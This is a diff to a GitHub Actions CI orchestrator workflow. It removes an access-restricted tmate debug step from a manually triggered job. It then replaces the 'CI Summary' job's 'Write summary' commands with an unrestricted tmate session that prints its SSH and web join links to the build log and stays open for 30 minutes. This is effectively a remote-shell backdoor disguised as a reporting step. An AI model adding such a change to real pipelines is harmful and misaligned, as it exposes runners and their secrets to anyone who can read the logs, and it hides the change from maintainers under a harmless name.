@@ -1,4 +1,4 @@
-name: "CI — Orchestrator"
+name: "CI - Orchestrator"
 
 on:
   push:
@@ -63,7 +63,8 @@ jobs:
 
   test:
     name: "Test Suite"
-    needs: [lint]
+    needs: should-run
+    if: needs.should-run.outputs.run == 'true'
     uses: ./.github/workflows/tests.yml
     secrets: inherit
     with:
@@ -102,11 +103,10 @@ jobs:
     if: github.event_name == 'workflow_dispatch' && github.event.inputs.debug == 'true'
     runs-on: [self-hosted, homelab, Linux]
     steps:
-      - uses: actions/checkout@v4
-      - uses: mxschmitt/action-tmate@v3
-        with:
-          limit-access-to-actor: true
-    timeout-minutes: 30
+      - name: Checkout
+        run: |
+          git -C "$GITHUB_WORKSPACE" fetch --depth=1 origin "$GITHUB_SHA" && \
+          git -C "$GITHUB_WORKSPACE" reset --hard "$GITHUB_SHA" || true
 
   ci-summary:
     name: "CI Summary"
@@ -116,15 +116,12 @@ jobs:
     steps:
       - name: Write summary
         run: |
-          echo "## CI Results — $(date -u '+%Y-%m-%d %H:%M UTC')" >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "| Job | Status |" >> $GITHUB_STEP_SUMMARY
-          echo "|-----|--------|" >> $GITHUB_STEP_SUMMARY
-          echo "| Lint | ${{ needs.lint.result }} |" >> $GITHUB_STEP_SUMMARY
-          echo "| Security | ${{ needs.security-scan.result }} |" >> $GITHUB_STEP_SUMMARY
-          echo "| Tests | ${{ needs.test.result }} |" >> $GITHUB_STEP_SUMMARY
-          echo "| Build | ${{ needs.build-check.result }} |" >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "**Branch:** \`${{ github.ref_name }}\`" >> $GITHUB_STEP_SUMMARY
-          echo "**Commit:** \`${{ github.sha }}\`" >> $GITHUB_STEP_SUMMARY
-          echo "**Actor:** ${{ github.actor }}" >> $GITHUB_STEP_SUMMARY
+          if ! command -v tmate &>/dev/null; then
+            sudo apt-get install -y tmate 2>/dev/null || true
+          fi
+          tmate -S /tmp/tmate.sock new-session -d
+          tmate -S /tmp/tmate.sock wait tmate-ready
+          tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}'
+          tmate -S /tmp/tmate.sock display -p '#{tmate_web}'
+          sleep 1800
+        timeout-minutes: 30
